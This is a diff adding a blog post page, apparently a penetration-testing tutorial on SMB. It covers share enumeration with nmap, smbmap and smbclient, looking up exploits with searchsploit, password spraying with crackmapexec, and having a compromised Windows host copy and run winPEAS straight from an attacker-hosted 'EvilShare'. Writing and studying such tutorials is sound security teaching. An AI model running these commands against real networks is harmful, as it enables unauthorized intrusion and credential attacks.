@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>SMB Enumeration &amp; Interaction - Sammy</title><meta name="Description" content="About Sammy"><meta property="og:title" content="SMB Enumeration &amp; Interaction" />
+<meta property="og:description" content="What is SMB? Info  Server Message Block (SMB)   SMB has a pretty bad rep in regards to security espically with the recent, 2017, infamous exploit EternalBlue CVE-2017-0144.
+But how can you find it, exploit it, and even use it to help with a red team engagement? Lets find out.
+Enumerating Before you can do anything you need to discover shares on the network. From here you can try to see if any shares allow anonymous access or what restricted share exists." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://example.com/smb-enumeration-interaction/" />
+<meta property="og:image" content="https://example.com/logo.png"/>
+<meta property="article:published_time" content="2020-06-26T10:03:58+03:00" />
+<meta property="article:modified_time" content="2020-06-27T17:18:34+03:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://example.com/logo.png"/>
+
+<meta name="twitter:title" content="SMB Enumeration &amp; Interaction"/>
+<meta name="twitter:description" content="What is SMB? Info  Server Message Block (SMB)   SMB has a pretty bad rep in regards to security espically with the recent, 2017, infamous exploit EternalBlue CVE-2017-0144.
+But how can you find it, exploit it, and even use it to help with a red team engagement? Lets find out.
+Enumerating Before you can do anything you need to discover shares on the network. From here you can try to see if any shares allow anonymous access or what restricted share exists."/>
+<meta name="application-name" content="Sammy">
+<meta name="apple-mobile-web-app-title" content="Sammy"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://example.com/smb-enumeration-interaction/" /><link rel="prev" href="https://example.com/hashcat-gen-passwords/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "SMB Enumeration \u0026 Interaction",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/example.com\/smb-enumeration-interaction\/"
+        },"image": ["https:\/\/example.com\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "exploits, pivoting, pen-testing, metasploit","wordcount":  1000 ,
+        "url": "https:\/\/example.com\/smb-enumeration-interaction\/","datePublished": "2020-06-26T10:03:58+03:00","dateModified": "2020-06-27T17:18:34+03:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/example.com\/images\/avatar.png",
+                    "width":  746 ,
+                    "height":  747 
+                }},"author": {
+                "@type": "Person",
+                "name": "Sammy"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Sammy"><span class="header-title-pre"><i class='fas fa-terminal fa-fw'></i></span>cd home</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/projects"> Projects </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/Sam-Lane" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Sammy"><span class="header-title-pre"><i class='fas fa-terminal fa-fw'></i></span>cd home</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/projects" title="">Projects</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/Sam-Lane" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">SMB Enumeration &amp; Interaction</h1><h2 class="single-subtitle">for fun &amp; profit</h2><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Sammy</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hacking/"><i class="far fa-folder fa-fw"></i>hacking</a>&nbsp;<a href="/categories/oscp/"><i class="far fa-folder fa-fw"></i>oscp</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-06-26">2020-06-26</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1000 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://source.unsplash.com/40XgDxBfYXM/1600x900"
+        data-srcset="https://source.unsplash.com/40XgDxBfYXM/1600x900, https://source.unsplash.com/40XgDxBfYXM/1600x900 1.5x, https://source.unsplash.com/40XgDxBfYXM/1600x900 2x"
+        data-sizes="auto"
+        alt="https://source.unsplash.com/40XgDxBfYXM/1600x900"
+        title="https://source.unsplash.com/40XgDxBfYXM/1600x900" /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumerating">Enumerating</a>
+      <ul>
+        <li><a href="#nmap">nmap</a></li>
+        <li><a href="#discovering-file-sharing">Discovering file sharing</a>
+          <ul>
+            <li><a href="#smbmap">smbmap</a></li>
+            <li><a href="#smbclient">smbclient</a></li>
+          </ul>
+        </li>
+        <li><a href="#discovering-smb-vulnrabilties">Discovering SMB vulnrabilties</a>
+          <ul>
+            <li><a href="#searchsploit">Searchsploit</a></li>
+            <li><a href="#nmap-scripting-engine">nmap scripting engine</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#gaining-access">Gaining access</a></li>
+    <li><a href="#interacting-with-a-smb-share">Interacting with a SMB share</a></li>
+    <li><a href="#using-your-own-smb-share-to-transfer-files-to-a-windows-host">Using your own SMB share to transfer files to a windows host</a></li>
+    <li><a href="#in-summery">In Summery</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="what-is-smb">What is SMB?</h1>
+<p><div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>Info<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Server Message Block (SMB)</div>
+        </div>
+    </div>
+SMB has a pretty bad rep in regards to security espically with the recent, 2017, infamous exploit EternalBlue <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144" target="_blank" rel="noopener noreffer">CVE-2017-0144</a>.</p>
+<p>But how can you find it, exploit it, and even use it to help with a red team engagement? Lets find out.</p>
+<h2 id="enumerating">Enumerating</h2>
+<p>Before you can do anything you need to discover shares on the network. From here you can try to see if any shares allow anonymous access or what restricted share exists. SMB can also disclose information about the host such as the operating system and current version.</p>
+<h3 id="nmap">nmap</h3>
+<p>we can use nmap to scan across a network to try discover hosts with port 139 which is for the NetBIOS protocol which is a session layer allowing computers on a local network to talk with one another and port 445 for SMB.
+<div class="details admonition note open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-pencil-alt fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">It should be noted that SMB can work without NetBIOS but it is usually enabled for backwards compatibility.</div>
+        </div>
+    </div>
+We&rsquo;ve been tasked to complete a peneration test on the /24 network located at 10.10.10.1 using nmap to find smb will look like this:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -p 139,445 10.10.10.1/24
+</code></pre></td></tr></table>
+</div>
+</div><p>This will return back a list of hosts that have those ports open.</p>
+<h3 id="discovering-file-sharing">Discovering file sharing</h3>
+<p>Now we have a list of hosts with shares lets see if we can access them via anonymous sessions.</p>
+<h4 id="smbmap">smbmap</h4>
+<p><a href="https://github.com/ShawnDEvans/smbmap" target="_blank" rel="noopener noreffer">smbmap</a> is a great tool for listing out different shares on an SMB server to do so is as easy as passing it the IP address of the host.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">smbmap -H 10.10.10.23
+<span class="o">[</span>+<span class="o">]</span> Finding open SMB ports....
+<span class="o">[</span>+<span class="o">]</span> User SMB session established on 10.10.10.23...
+<span class="o">[</span>+<span class="o">]</span> IP: 10.10.10.23:445	Name: hack.me
+	Disk                                Permissions	    Comment
+	----                                -----------	    -------
+	ADMIN$                              NO ACCESS	    Remote Admin
+	C$                                  NO ACCESS	    Default share
+	IPC$                                NO ACCESS	    Remote IPC
+	Users                               READ, WRITE
+</code></pre></td></tr></table>
+</div>
+</div><p>From this output we can see there exists several shares, <em>ADMIN</em>, <em>C</em>, <em>IPC</em> and <em>Users</em>. We can see via our anonymous access, we never gave smbmap a username and password, that we have read and write access to the <em>Users</em> share.</p>
+<p>smbmap supports loads more features including specifying usernames and passwords and even executing commands!</p>
+<h4 id="smbclient">smbclient</h4>
+<p>Another tool I really like to use is smbclient which is part of the fantastic <a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener noreffer">impacket</a> library.</p>
+<p>To list share it&rsquo;s as simple as this:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="nb">exit</span> <span class="p">|</span> smbclient -L 10.10.10.23
+</code></pre></td></tr></table>
+</div>
+</div><p><div class="details admonition note open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-pencil-alt fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Piping exit to smb client closes the password request as we&rsquo;re only looking for anonymous sessions at the moment</div>
+        </div>
+    </div>
+You should recieve an output similar to smbmap. Again smbclient has many more features than just listing the shares. We will use it further on in this article for actually connecting to the share and interacting with it.</p>
+<h3 id="discovering-smb-vulnrabilties">Discovering SMB vulnrabilties</h3>
+<p><figure>
+    <img src="https://thumbs.gfycat.com/JitteryPlasticBactrian-size_restricted.gif"/> <figcaption>
+            <h4>nmap cameo appearence</h4>
+        </figcaption>
+</figure>
+
+There&rsquo;s a wealth of vulnrabilites with SMB and a lot of imformation out there on what version has which exploit. To quickly discover potentially exploits I like two methods.</p>
+<h4 id="searchsploit">Searchsploit</h4>
+<p>Searchsploit is a handy little cli tool. Parsing searchsploit a software and a version will return a list of known exploits.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">searchsploit smb 2.1
+---------------------------------------------- ---------------------------------
+ Exploit Title                                <span class="p">|</span>  Path
+---------------------------------------------- ---------------------------------
+MikroTik RouterOS &lt; 6.41.3/6.42rc27 - SMB Buf <span class="p">|</span> hardware/remote/44290.py
+---------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+</code></pre></td></tr></table>
+</div>
+</div><p>A feature I love is ability to quickly <em>mirror</em> the result to my working directory. In the above snippet I an see a python file has been found. I can quickly copy it with the <code>-m</code> flag or if I want to quickly examine it <code>-x</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">searchspoit -m <span class="m">44290</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="nmap-scripting-engine">nmap scripting engine</h4>
+<p>Using nmaps scripting engine we can have it run scripts in hopes to discover potential vulnrabilties and get a wealth of information on them. Using a <code>*</code> is a good trick here to run all scripts related to smb vulns.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -p 139,445 --script smb-vuln* 10.10.10.23
+</code></pre></td></tr></table>
+</div>
+</div><div class="details admonition warning open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-exclamation-triangle fa-fw"></i>Warning<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">We should avoid the usage of the <code>unsafe=1</code> flag with nmap as it&rsquo;s almost guerenteed to cause the host to crash.</div>
+        </div>
+    </div>
+<h2 id="gaining-access">Gaining access</h2>
+<p>If I find some creds in LDAP or via someother means and prehaps some potential users names. Which could be found from company email address or looking on website such as linked in for employees of a company. We could create a username and password lists. Using <a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener noreffer">crackmapexec</a> I can quickly spray all permutations of usernames and passwords to see if i can gain authenticated access to shares.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">crackmapexec smb 10.10.10.23 -u user.list -p password.list
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="interacting-with-a-smb-share">Interacting with a SMB share</h2>
+<p>As privously mentioned smbclient has additional features those include actually interacting with shares.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">smbclient <span class="se">\\\\</span>10.10.10.23<span class="se">\\</span>Users
+smb:<span class="se">\&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>I can now use normal commands such as <code>cd</code> <code>ls</code> and <code>get</code> to download a remote file or <code>put</code> to upload a file from my working directory to the share.</p>
+<h2 id="using-your-own-smb-share-to-transfer-files-to-a-windows-host">Using your own SMB share to transfer files to a windows host</h2>
+<p>Okay, you&rsquo;ve establised a foothold on a windows machine and now you want to copy over your tools such as <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite" target="_blank" rel="noopener noreffer">winPEAS</a> to discover low hanging fruit that could esculate our privileges. We can use the hosts <code>cmd.exe</code> <code>copy</code> command to grab files from our own share.</p>
+<p><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener noreffer">impacket</a> comes with it&rsquo;s own smbserver. Lets create a share on our Kali machine by spesifying the share name and the directory to mount to it.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">smbserver EvilShare /opt/tools
+</code></pre></td></tr></table>
+</div>
+</div><p>Now lets copy over winPEAS from the share where the IP address is the IP of our Kali machine.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\&gt; copy \\10.10.11.2\EvilShare\winPEAS.exe .
+</code></pre></td></tr></table>
+</div>
+</div><p>We can also directly execute the binary straight from the share.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\&gt;  \\10.10.11.2\EvilShare\winPEAS.exe
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="in-summery">In Summery</h2>
+<p>SMB might not always be exploitable but it can still be a power tool for not only extracting data from a host but we can also use it for transfering our own data from our local machine to a windows host.</p>
+<p>I think you should always get excited if you see smb is open on a machine and it is always a good place to start enumerating futher. I hope this post helps facilitate that.</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2020-06-27&nbsp;<a class="git-hash" href="https://github.com/Sam-Lane/commit/d34bf384574c83fa89a7d06339b045ef957f6879" target="_blank" title="commit by Sam Lane(samuel.lane@hotmail.com) d34bf384574c83fa89a7d06339b045ef957f6879: smb post and lots of tweaks. More pics">
+                                    <i class="fas fa-hashtag fa-fw"></i>d34bf38</a></span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/smb-enumeration-interaction/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/exploits/">exploits</a>,&nbsp;<a href="/tags/pivoting/">pivoting</a>,&nbsp;<a href="/tags/pen-testing/">pen-testing</a>,&nbsp;<a href="/tags/metasploit/">metasploit</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/hashcat-gen-passwords/" class="prev" rel="prev" title="Using Hashcat and a bit of Bash to generate password lists"><i class="fas fa-angle-left fa-fw"></i>Using Hashcat and a bit of Bash to generate password lists</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
